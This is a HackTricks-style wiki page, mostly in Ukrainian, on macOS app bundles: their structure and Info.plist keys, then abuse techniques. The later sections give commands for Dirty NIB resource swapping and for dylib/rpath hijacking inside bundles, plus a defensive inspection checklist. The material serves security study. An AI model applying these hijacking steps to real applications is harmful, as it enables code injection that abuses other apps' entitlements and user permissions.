# macOS Пакети

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Пакети в macOS виконують роль контейнерів для різних ресурсів, включно з додатками, бібліотеками та іншими необхідними файлами, показуючись у Finder як один об'єкт — наприклад знайомі файли `*.app`. Найпоширенішим пакетом є `.app`, хоча також зустрічаються інші типи, як-от `.framework`, `.systemextension` та `.kext`.

### Основні компоненти пакету

У пакеті, зокрема в каталозі `<application>.app/Contents/`, міститься низка важливих ресурсів:

- **\_CodeSignature**: Цей каталог зберігає відомості про підпис коду, які важливі для перевірки цілісності додатка. Ви можете переглянути інформацію про підпис коду за допомогою команд, таких як:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Містить виконуваний бінарний файл програми, який запускається при взаємодії користувача.
- **Resources**: Сховище компонентів інтерфейсу програми, включно зі зображеннями, документами та описами інтерфейсу (nib/xib файли).
- **Info.plist**: Виступає як головний конфігураційний файл програми, необхідний системі для коректного розпізнавання та взаємодії з програмою.

#### Important Keys in Info.plist

Файл `Info.plist` — це основа конфігурації програми, що містить ключі, такі як:

- **CFBundleExecutable**: Вказує ім'я головного виконуваного файлу, що знаходиться в директорії `Contents/MacOS`.
- **CFBundleIdentifier**: Надає глобальний ідентифікатор програми, який широко використовується macOS для управління додатками.
- **LSMinimumSystemVersion**: Вказує мінімальну версію macOS, необхідну для запуску програми.

### Exploring Bundles

Щоб переглянути вміст бандлу, наприклад `Safari.app`, можна використати таку команду: `bash ls -lR /Applications/Safari.app/Contents`

Це дослідження виявляє директорії на кшталт `_CodeSignature`, `MacOS`, `Resources`, та файли, як-от `Info.plist`, кожен з яких виконує свою роль — від захисту програми до визначення її інтерфейсу та параметрів роботи.

#### Additional Bundle Directories

Окрім звичних директорій, бандли можуть також містити:

- **Frameworks**: Містить упаковані фреймворки, які використовує програма. Frameworks схожі на dylib з додатковими ресурсами.
- **PlugIns**: Директорія для plug‑in'ів та розширень, що додають функціональність програмі.
- **XPCServices**: Містить XPC сервіси, які використовує програма для міжпроцесної (out‑of‑process) комунікації.

Така структура забезпечує інкапсуляцію всіх необхідних компонентів всередині бандлу, сприяючи модульному та безпечному середовищу для програми.

Для докладнішої інформації про ключі `Info.plist` та їх значення, документація Apple для розробників містить великі ресурси: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Коли карантинний бандл запускається вперше, macOS виконує глибоку перевірку підпису і може запускати його з випадково згенерованого translocated path. Після прийняття, подальші запуски виконують лише поверхневі перевірки; файли ресурсів у `Resources/`, `PlugIns/`, nibs тощо історично не перевірялися. Починаючи з macOS 13 Ventura при першому запуску застосовується глибока перевірка, а новий *App Management* TCC дозвіл обмежує зміну інших бандлів третіми процесами без згоди користувача, але старіші системи залишаються вразливими.
- **Bundle Identifier collisions**: Кілька вбудованих таргетів (PlugIns, helper tools), що повторно використовують той самий `CFBundleIdentifier`, можуть порушити валідацію підпису і іноді дозволити URL‑scheme hijacking/confusion. Завжди перераховуйте підбандли та перевіряйте унікальні ID.

## Resource Hijacking (Dirty NIB / NIB Injection)

Before Ventura, swapping UI resources in a signed app could bypass shallow code signing and yield code execution with the app’s entitlements. Current research (2024) shows this still works on pre‑Ventura and on un-quarantined builds:

1. Копіюйте цільовий додаток у записуване місце (наприклад, `/tmp/Victim.app`).
2. Замініть `Contents/Resources/MainMenu.nib` (або будь-який nib, оголошений у `NSMainNibFile`) на шкідливий, який інстанціює `NSAppleScript`, `NSTask` тощо.
3. Запустіть додаток. Шкідливий nib виконується під bundle ID жертви та його entitlements (TCC grants, microphone/camera тощо).
4. Ventura+ пом'якшує це шляхом глибокої верифікації бандлу при першому запуску та вимоги *App Management* дозволу для подальших змін, тому отримати persistence складніше, але атаки при першому запуску на старих версіях macOS все ще застосовні.

Minimal malicious nib payload example (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking inside Bundles

Оскільки пошук `@rpath` віддає перевагу вбудованим Frameworks/PlugIns, розміщення шкідливої бібліотеки в `Contents/Frameworks/` або `Contents/PlugIns/` може змінити порядок завантаження, якщо головний бінарний файл підписано без library validation або при слабкому порядку `LC_RPATH`.

Типові кроки при зловживанні unsigned/ad‑hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
- Hardened runtime з відсутнім `com.apple.security.cs.disable-library-validation` блокує сторонні dylibs; спочатку перевірте entitlements.
- XPC services під `Contents/XPCServices/` часто завантажують суміжні frameworks — патчіть їхні бінарні файли аналогічно для шляхів persistence або privilege escalation.

## Швидка шпаргалка для перевірки
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Посилання

- [Показ process injection у view(s): експлуатація macOS apps із використанням nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering — розбір (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
